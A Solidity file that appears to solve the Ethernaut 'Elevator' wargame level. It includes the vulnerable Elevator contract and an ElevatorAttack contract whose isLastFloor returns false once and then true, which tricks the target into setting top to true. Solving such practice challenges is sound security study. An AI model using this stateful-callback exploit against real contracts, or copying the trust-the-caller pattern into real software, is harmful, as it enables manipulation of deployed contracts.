// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

// 0x44dC82b89A675F5d1a49f387A7b7c3E2A7C93104
contract Elevator {
    bool public top;
    uint public floor;
    uint public a_;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

// Elevator Attack
// Create a contract with a malicious isLastFloor function
contract ElevatorAttack {
    Elevator public elevator;
    bool first = true;

    constructor(Elevator elevator_) {
        elevator = elevator_;
    }

    // Return false once to get around if/else statement.
    // Then, always return true.
    function isLastFloor(uint) public returns (bool) {
        if (first) {
            first = false;
            return false;
        }
        return true;
    }

    function goTo(uint _floor) public {
        elevator.goTo(_floor);
    }
}
